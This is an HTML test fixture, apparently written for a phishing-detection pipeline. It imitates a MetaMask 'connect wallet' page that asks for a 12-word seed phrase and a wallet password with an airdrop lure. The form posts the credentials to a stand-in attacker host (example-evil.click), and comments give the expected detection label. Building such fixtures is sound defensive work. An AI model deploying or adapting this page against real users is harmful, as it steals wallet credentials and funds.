<!doctype html>
<!--
  ============================================================================
  FOR LOCAL TESTING ONLY — DO NOT DEPLOY.
  Static fixture imitating a fake crypto wallet "connect" page that asks for
  the user's seed phrase (12/24 words). Real wallets NEVER ask for the seed
  phrase during a connect flow — this is a textbook seed-phrase phishing kit.
  ============================================================================
-->
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>MetaMask — Connect Wallet</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style>
      body { margin: 0; font-family: system-ui, sans-serif; background: #1c1b1f; color: #e5e5e5; min-height: 100vh; display: grid; place-items: center; }
      .card { max-width: 460px; background: #24232a; padding: 32px; border: 1px solid #3a3942; border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.4); }
      .fox { font-size: 38px; text-align: center; margin-bottom: 6px; }
      h1 { font-size: 20px; margin: 0 0 6px; text-align: center; }
      .sub { font-size: 13px; color: #a3a3a3; text-align: center; margin: 0 0 22px; }
      .warn { background: #2b1f12; border-left: 3px solid #f59e0b; padding: 10px 12px; font-size: 12.5px; margin: 12px 0; border-radius: 4px; }
      label { font-size: 12.5px; display: block; margin: 14px 0 6px; color: #c4c4c4; }
      .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 6px; }
      input[type="text"] { width: 100%; padding: 8px; box-sizing: border-box; border: 1px solid #4b4954; background: #1c1b1f; color: #e5e5e5; border-radius: 4px; font-size: 13px; }
      button { width: 100%; margin-top: 20px; padding: 12px; background: #f5841f; color: white; border: 0; border-radius: 8px; font-size: 14px; font-weight: 700; cursor: pointer; }
      a { color: #f5841f; }
    </style>
  </head>
  <body>
    <main class="card">
      <div class="fox">🦊</div>
      <h1>Connect your wallet</h1>
      <p class="sub">Restore access to claim your eligible airdrop allocation</p>

      <div class="warn">
        ⚠ Your wallet has been flagged for migration. Enter your 12-word seed phrase
        to verify ownership and continue.
      </div>

      <!--
        Action collects the seed phrase. Real MetaMask never asks for this.
        Stage 3 LLM should easily flag this as credential-harvest with
        category=wallet_drainer.
      -->
      <form action="https://wallet-migrate.example-evil.click/drain" method="post">
        <label>Secret Recovery Phrase (12 or 24 words)</label>
        <div class="grid">
          <input type="text" name="w1" placeholder="1" autocomplete="off" />
          <input type="text" name="w2" placeholder="2" autocomplete="off" />
          <input type="text" name="w3" placeholder="3" autocomplete="off" />
          <input type="text" name="w4" placeholder="4" autocomplete="off" />
          <input type="text" name="w5" placeholder="5" autocomplete="off" />
          <input type="text" name="w6" placeholder="6" autocomplete="off" />
          <input type="text" name="w7" placeholder="7" autocomplete="off" />
          <input type="text" name="w8" placeholder="8" autocomplete="off" />
          <input type="text" name="w9" placeholder="9" autocomplete="off" />
          <input type="text" name="w10" placeholder="10" autocomplete="off" />
          <input type="text" name="w11" placeholder="11" autocomplete="off" />
          <input type="text" name="w12" placeholder="12" autocomplete="off" />
        </div>
        <label>Wallet password</label>
        <input type="password" name="walletpass" style="width:100%; padding:8px; box-sizing:border-box; border:1px solid #4b4954; background:#1c1b1f; color:#e5e5e5; border-radius:4px;" />
        <button type="submit">Restore Wallet & Claim Airdrop</button>
      </form>
    </main>
  </body>
</html>
